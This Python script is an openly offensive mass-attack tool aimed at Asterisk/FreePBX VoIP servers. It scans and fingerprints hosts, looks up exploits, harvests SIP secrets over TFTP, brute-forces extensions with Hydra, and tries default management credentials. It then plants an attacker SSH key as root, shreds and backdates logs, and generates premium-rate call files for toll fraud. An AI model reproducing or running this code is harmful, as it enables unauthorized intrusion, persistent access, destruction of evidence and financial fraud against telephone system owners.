#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════╗
║            VOIP RED TEAM  - PRO EDITION             ║
║  Phase 1: Async Recon (TCP + UDP, HTTP + SIP parallel)                 ║
║  Phase 2: Dual Fingerprint (SIP banner + HTTP Server header)           ║
║  Phase 3: Smart Exploit (Only if version is vulnerable)               ║
║  Phase 4: Adaptive Harvesting (TFTP kills Hydra if config found)      ║
║  Phase 5: Admin Takeover (AMI/ARI using TFTP creds first)             ║
║  Phase 6: Advanced Persistence (SSH key injection via AMI)            ║
║  Phase 7: Cover Tracks (Shred logs + timestamp tampering)             ║
║  Phase 8: Monetization (Generate premium dialing .call file)          ║
╚══════════════════════════════════════════════════════════════════════════╝
"""
import asyncio
import subprocess
import sys
import os
import json
import re
import time
import socket
import argparse
import ipaddress
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# ─── TRY TO IMPORT RICH ──────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn, TimeElapsedColumn
    from rich.panel import Panel
    from rich import box
    RICH = True
except ImportError:
    RICH = False
    print("[!] Install rich for better UI: pip install rich")

# ─── GLOBALS ──────────────────────────────────────────────────────────────────
VERSION_DB = {
    "Asterisk": {"vulnerable": ["13.0.0", "13.1.0", "16.0.0", "16.1.0", "17.0.0"]},
    "FreePBX": {"vulnerable": ["14.0", "15.0"]},
}
PORTS = {"tcp": [5060, 5061, 5038, 8088, 80, 443, 8080], "udp": [69, 161, 5060]}
THREADS = 50
HYDRA_TIMEOUT = 45  # Hydra runs max 45s before being killed
WORDLIST = "/usr/share/wordlists/rockyou.txt"
PROXY_LIST = []  # SOCKS5 proxies (optional)
SSH_PUB_KEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... hacker@attacker"  # Replace with real key

# ─── ASYNC NETWORK ENGINE ──────────────────────────────────────────────────
class AsyncProbe:
    @staticmethod
    async def tcp_scan(ip, port, timeout=2.0):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=timeout)
            w.close()
            await asyncio.wait_for(w.wait_closed(), timeout=0.3)
            return port
        except:
            return None

    @staticmethod
    async def udp_send_recv(ip, port, data, timeout=2.0):
        try:
            loop = asyncio.get_running_loop()
            fut = loop.create_future()
            class Proto(asyncio.DatagramProtocol):
                def datagram_received(self, data, addr):
                    if not fut.done(): fut.set_result(data)
                def error_received(self, exc):
                    if not fut.done(): fut.set_exception(exc)
            transport, proto = await loop.create_datagram_endpoint(lambda: Proto(), remote_addr=(ip, port))
            transport.sendto(data)
            result = await asyncio.wait_for(fut, timeout=timeout)
            transport.close()
            return result
        except:
            return None

    @staticmethod
    async def sip_probe(ip, port=5060):
        call_id = f"{int(time.time())}@scanner"
        msg = (f"OPTIONS sip:{ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner;branch=z9hG4bK-{int(time.time())}\r\n"
               f"To: <sip:{ip}>\r\nFrom: <sip:scanner@scanner>;tag=scan\r\nCall-ID: {call_id}\r\nCSeq: 1 OPTIONS\r\n"
               f"Content-Length: 0\r\n\r\n").encode()
        resp = await AsyncProbe.udp_send_recv(ip, port, msg, timeout=2.5)
        if resp:
            return resp.decode(errors="replace")
        return None

    @staticmethod
    async def http_probe(ip, port=80):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2.0)
            w.write(b"HEAD / HTTP/1.0\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await w.drain()
            resp = await asyncio.wait_for(r.read(4096), timeout=2.0)
            w.close()
            return resp.decode(errors="replace")
        except:
            return None

# ─── CORE PHASES ────────────────────────────────────────────────────────────
class HackerEngine:
    def __init__(self, ip):
        self.ip = ip
        self.loot = {"ip": ip, "timestamp": datetime.now().isoformat()}
        self.recon = {}
        self.hydra_task = None

    async def phase1_recon(self):
        """Async recon: TCP + UDP, HTTP + SIP in parallel."""
        print(f"[*] Phase1: Recon on {self.ip}")
        tcp_coros = [AsyncProbe.tcp_scan(self.ip, p, timeout=1.5) for p in PORTS["tcp"]]
        sip_coro = AsyncProbe.sip_probe(self.ip, 5060)
        http_coro = AsyncProbe.http_probe(self.ip, 80)

        results = await asyncio.gather(
            asyncio.gather(*tcp_coros),
            sip_coro,
            http_coro,
            return_exceptions=True
        )
        tcp_ports = [p for p in results[0] if p is not None]
        sip_raw = results[1] if isinstance(results[1], str) else None
        http_raw = results[2] if isinstance(results[2], str) else None

        self.recon = {"tcp_ports": tcp_ports, "sip_raw": sip_raw, "http_raw": http_raw}
        self.loot["recon"] = self.recon

        # Determine if alive
        if not tcp_ports and not sip_raw:
            self.loot["alive"] = False
            print(f"[!] {self.ip} is dead.")
            return False
        self.loot["alive"] = True
        return True

    async def phase2_fingerprint(self):
        """Dual fingerprint: SIP + HTTP."""
        print(f"[*] Phase2: Fingerprint {self.ip}")
        sip_banner = self.recon.get("sip_raw", "")
        http_banner = self.recon.get("http_raw", "")

        product = "Unknown"
        version = "0.0"
        # Parse SIP
        if "Asterisk" in sip_banner:
            product = "Asterisk"
            m = re.search(r'Asterisk\s+(\d+\.\d+\.\d+)', sip_banner)
            if m: version = m.group(1)
        elif "FreePBX" in sip_banner or "FreePBX" in http_banner:
            product = "FreePBX"
            m = re.search(r'FreePBX\s+(\d+\.\d+)', http_banner)
            if m: version = m.group(1)
        elif "3CX" in sip_banner or "3CX" in http_banner:
            product = "3CX"
        elif "Cisco" in sip_banner or "CUCM" in http_banner:
            product = "Cisco CUCM"

        self.loot["product"] = product
        self.loot["version"] = version
        print(f"[+] {self.ip} -> {product} {version}")
        return product, version

    async def phase3_smart_exploit(self, product, version):
        """Only run searchsploit if version is in vulnerable DB."""
        print(f"[*] Phase3: Smart exploit check {self.ip}")
        if product in VERSION_DB:
            vuln_list = VERSION_DB[product].get("vulnerable", [])
            if any(v in version for v in vuln_list):
                # Fire searchsploit
                cmd = f"searchsploit {product} {version} --json"
                proc = await asyncio.create_subprocess_shell(cmd, stdout=asyncio.subprocess.PIPE)
                stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=10)
                try:
                    data = json.loads(stdout.decode())
                    for exp in data.get("RESULTS", []):
                        if "Remote" in exp.get("Title", ""):
                            self.loot["exploit_path"] = exp.get("Path")
                            print(f"[!] Exploit found: {self.loot['exploit_path']}")
                            return
                except:
                    pass
        self.loot["exploit_path"] = None
        print(f"[ ] No suitable exploit for {product} {version}")

    async def phase4_adaptive_harvest(self):
        """
        Adaptive: TFTP, SNMP, HTTP config, Extension enum, Hydra.
        If TFTP succeeds -> KILL Hydra immediately.
        """
        print(f"[*] Phase4: Adaptive harvest on {self.ip}")
        results = {}

        # Task: TFTP (GOLDMINE)
        async def tftp_task():
            tftp_files = {}
            for fname in ["sip.conf", "extensions.conf", "voicemail.conf", "000000000000.cfg"]:
                cmd = f"tftp {self.ip} -c get /etc/asterisk/{fname} tftp_{self.ip}_{fname} 2>/dev/null"
                await asyncio.create_subprocess_shell(cmd, shell=True)
                if os.path.exists(f"tftp_{self.ip}_{fname}") and os.path.getsize(f"tftp_{self.ip}_{fname}") > 10:
                    tftp_files[fname] = f"tftp_{self.ip}_{fname}"
                    # If we find sip.conf, extract credentials immediately
                    if fname == "sip.conf":
                        with open(f"tftp_{self.ip}_{fname}") as f:
                            for line in f:
                                if "secret=" in line or "password=" in line:
                                    if "sip_creds" not in results:
                                        results["sip_creds"] = line.strip()
            return tftp_files

        # Task: SNMP
        async def snmp_task():
            for comm in ["public", "private"]:
                cmd = f"snmpwalk -v2c -c {comm} {self.ip} 1.3.6.1.2.1.1.1.0 > snmp_{self.ip}_{comm}.txt 2>/dev/null"
                await asyncio.create_subprocess_shell(cmd, shell=True)
                if os.path.getsize(f"snmp_{self.ip}_{comm}.txt") > 0:
                    return comm
            return None

        # Task: Extension Enumeration (native REGISTER scan)
        async def ext_enum():
            exts = []
            for e in range(100, 210):
                call_id = f"{e}@scanner"
                msg = (f"REGISTER sip:{self.ip} SIP/2.0\r\nVia: SIP/2.0/UDP scanner\r\n"
                       f"To: <sip:{e}@{self.ip}>\r\nFrom: <sip:{e}@{self.ip}>;tag=scan\r\nCall-ID: {call_id}\r\n"
                       f"CSeq: 1 REGISTER\r\nExpires: 60\r\nContent-Length: 0\r\n\r\n").encode()
                resp = await AsyncProbe.udp_send_recv(self.ip, 5060, msg, timeout=1.0)
                if resp and (b"401" in resp or b"407" in resp or b"200" in resp):
                    exts.append(str(e))
            return exts

        # Task: Hydra (will be killed if TFTP finds creds)
        async def hydra_task(ext_list):
            if not ext_list:
                return None
            with open(f"exts_{self.ip}.txt", "w") as f:
                f.write("\n".join(ext_list))
            cmd = f"hydra -L exts_{self.ip}.txt -P {WORDLIST} sip://{self.ip} -o hydra_{self.ip}.txt -t 4 -f"
            try:
                proc = await asyncio.create_subprocess_shell(cmd, shell=True)
                await asyncio.wait_for(proc.wait(), timeout=HYDRA_TIMEOUT)
            except asyncio.TimeoutError:
                proc.kill()
            if os.path.exists(f"hydra_{self.ip}.txt") and os.path.getsize(f"hydra_{self.ip}.txt") > 0:
                with open(f"hydra_{self.ip}.txt") as f:
                    return f.read()
            return None

        # 1. Launch TFTP, SNMP, ExtEnum FIRST
        tftp_fut = asyncio.create_task(tftp_task())
        snmp_fut = asyncio.create_task(snmp_task())
        ext_fut = asyncio.create_task(ext_enum())

        tftp_res = await tftp_fut
        snmp_res = await snmp_fut
        ext_list = await ext_fut

        results["tftp_files"] = tftp_res
        results["snmp_community"] = snmp_res
        results["extensions"] = ext_list

        # 2. If TFTP has sip.conf, extract secret and SKIP Hydra
        sip_creds = None
        if tftp_res and "sip.conf" in tftp_res:
            with open(tftp_res["sip.conf"]) as f:
                for line in f:
                    if "secret=" in line or "password=" in line:
                        sip_creds = line.strip()
                        break
            if sip_creds:
                results["sip_creds"] = sip_creds
                print(f"[+] TFTP gave creds: {sip_creds} -> KILLING HYDRA")
                # Hydra NOT launched
            else:
                # No creds in config, still launch hydra
                hydra_res = await hydra_task(ext_list)
                if hydra_res:
                    results["hydra_output"] = hydra_res
        else:
            # No TFTP -> launch hydra
            hydra_res = await hydra_task(ext_list)
            if hydra_res:
                results["hydra_output"] = hydra_res

        self.loot["harvest"] = results
        return results

    async def phase5_admin_takeover(self, harvest):
        """
        Use creds from TFTP first, then fallback to defaults.
        AMI: try to get shell.
        """
        print(f"[*] Phase5: Admin takeover on {self.ip}")
        ami_creds = None

        # Priority 1: Extract from harvest
        if "sip_creds" in harvest:
            # Parse "secret=xyz" or "password=xyz"
            m = re.search(r'(secret|password)\s*=\s*(\S+)', harvest["sip_creds"])
            if m:
                pwd = m.group(2)
                # Try with admin, manager, root
                for user in ["admin", "manager", "root"]:
                    if await self._ami_login(user, pwd):
                        ami_creds = f"{user}:{pwd}"
                        break

        # Priority 2: Defaults
        if not ami_creds:
            for user, pwd in [("admin","admin"), ("manager","secret"), ("asterisk","asterisk")]:
                if await self._ami_login(user, pwd):
                    ami_creds = f"{user}:{pwd}"
                    break

        self.loot["ami_creds"] = ami_creds

        # ARI check
        ari_creds = None
        for user, pwd in [("admin","admin"), ("asterisk","asterisk"), ("ari","ari")]:
            if await self._ari_login(user, pwd):
                ari_creds = f"{user}:{pwd}"
                break
        self.loot["ari_creds"] = ari_creds
        return ami_creds, ari_creds

    async def _ami_login(self, user, pwd):
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(self.ip, 5038), timeout=3)
            w.write(f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n".encode())
            await w.drain()
            resp = await asyncio.wait_for(r.read(1024), timeout=3)
            w.close()
            return b"Success" in resp
        except:
            return False

    async def _ari_login(self, user, pwd):
        try:
            import aiohttp
            async with aiohttp.ClientSession() as sess:
                url = f"http://{self.ip}:8088/ari/applications"
                async with sess.get(url, auth=aiohttp.BasicAuth(user, pwd), timeout=3) as resp:
                    return resp.status == 200
        except:
            return False

    async def phase6_persistence(self, ami_creds):
        """Inject SSH key via AMI Command."""
        print(f"[*] Phase6: Advanced persistence on {self.ip}")
        if not ami_creds:
            print("[!] No AMI creds, skipping persistence")
            return

        user, pwd = ami_creds.split(":")
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(self.ip, 5038), timeout=3)
            w.write(f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n".encode())
            await w.drain()
            await asyncio.sleep(0.3)

            # Inject SSH key
            ssh_cmd = f"echo '{SSH_PUB_KEY}' >> /root/.ssh/authorized_keys"
            cmd = f"Action: Command\r\nCommand: {ssh_cmd}\r\n\r\n"
            w.write(cmd.encode())
            await w.drain()
            resp = await asyncio.wait_for(r.read(2048), timeout=3)
            w.close()
            if "Response: Success" in resp.decode():
                self.loot["persistence"] = "SSH key injected successfully"
                print(f"[+] SSH key injected on {self.ip}")
            else:
                self.loot["persistence"] = "SSH injection failed"
        except Exception as e:
            self.loot["persistence"] = f"Error: {e}"

    async def phase7_cover_tracks(self, ami_creds):
        """Shred logs + timestamp tamper via AMI shell."""
        print(f"[*] Phase7: Cover tracks on {self.ip}")
        if not ami_creds:
            return
        user, pwd = ami_creds.split(":")
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(self.ip, 5038), timeout=3)
            w.write(f"Action: Login\r\nUsername: {user}\r\nSecret: {pwd}\r\n\r\n".encode())
            await w.drain()
            await asyncio.sleep(0.3)

            # Shred logs
            shred_cmd = "shred -zf /var/log/asterisk/full /var/log/asterisk/messages /root/.bash_history"
            cmd = f"Action: Command\r\nCommand: {shred_cmd}\r\n\r\n"
            w.write(cmd.encode())
            await w.drain()
            await asyncio.sleep(0.5)
            # Timestamp tamper
            touch_cmd = "touch -t 202001010000 /var/log/asterisk/full"
            cmd2 = f"Action: Command\r\nCommand: {touch_cmd}\r\n\r\n"
            w.write(cmd2.encode())
            await w.drain()
            resp = await asyncio.wait_for(r.read(2048), timeout=3)
            w.close()
            self.loot["logs_cleaned"] = True if "Response: Success" in resp.decode() else False
            print(f"[+] Logs shredded & timestamped on {self.ip}")
        except:
            pass

    def phase8_monetize(self):
        """Generate call file for premium dialing."""
        print(f"[*] Phase8: Monetization generation for {self.ip}")
        fraud_calls = []
        if "sip_creds" in self.loot.get("harvest", {}):
            # Extract extension
            m = re.search(r'username\s*=\s*(\d+)', self.loot["harvest"].get("sip_creds", ""))
            if m:
                ext = m.group(1)
                fraud_calls.append(f"Channel: SIP/{ext}\nMaxRetries: 0\nContext: default\nExtension: 19005551212\nPriority: 1")
        if fraud_calls:
            with open(f"fraud_{self.ip}.call", "w") as f:
                f.write("\n\n".join(fraud_calls))
            self.loot["monetization"] = f"fraud_{self.ip}.call generated"
        else:
            self.loot["monetization"] = "No creds to monetize"

# ─── ORCHESTRATOR ──────────────────────────────────────────────────────────
async def hack_target(ip):
    engine = HackerEngine(ip)

    # Phase 1
    if not await engine.phase1_recon():
        return engine.loot

    # Phase 2
    product, version = await engine.phase2_fingerprint()

    # Phase 3
    await engine.phase3_smart_exploit(product, version)

    # Phase 4
    harvest = await engine.phase4_adaptive_harvest()

    # Phase 5
    ami, ari = await engine.phase5_admin_takeover(harvest)

    # Phase 6
    if ami:
        await engine.phase6_persistence(ami)

    # Phase 7
    if ami:
        await engine.phase7_cover_tracks(ami)

    # Phase 8
    engine.phase8_monetize()

    return engine.loot

async def main():
    parser = argparse.ArgumentParser(description="Adaptive VoIP Kill-Chain")
    parser.add_argument("-f", "--file", default="targets.txt", help="Target file")
    parser.add_argument("-t", "--target", help="Single target")
    args = parser.parse_args()

    targets = []
    if args.target:
        targets.append(args.target)
    else:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        with open(args.file) as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"[+] Loaded {len(targets)} targets.")
    all_loot = {}

    if RICH:
        from rich.console import Console
        console = Console()
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TaskProgressColumn(), TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Hacking targets...", total=len(targets))
            sem = asyncio.Semaphore(THREADS)

            async def bounded(ip):
                async with sem:
                    loot = await hack_target(ip)
                    all_loot[ip] = loot
                    progress.update(task, advance=1,
                                    description=f"[green]{ip} | AMI:{loot.get('ami_creds','-')} | TFTP:{bool(loot.get('harvest',{}).get('tftp_files'))}")
                    return loot

            await asyncio.gather(*[bounded(ip) for ip in targets])
    else:
        for ip in targets:
            loot = await hack_target(ip)
            all_loot[ip] = loot
            print(f"Done: {ip} | AMI: {loot.get('ami_creds','-')}")

    # Save master loot
    with open("hacker_master_loot.json", "w") as f:
        json.dump(all_loot, f, indent=2)
    print(f"\n[+] Master loot saved to hacker_master_loot.json")

if __name__ == "__main__":
    asyncio.run(main())
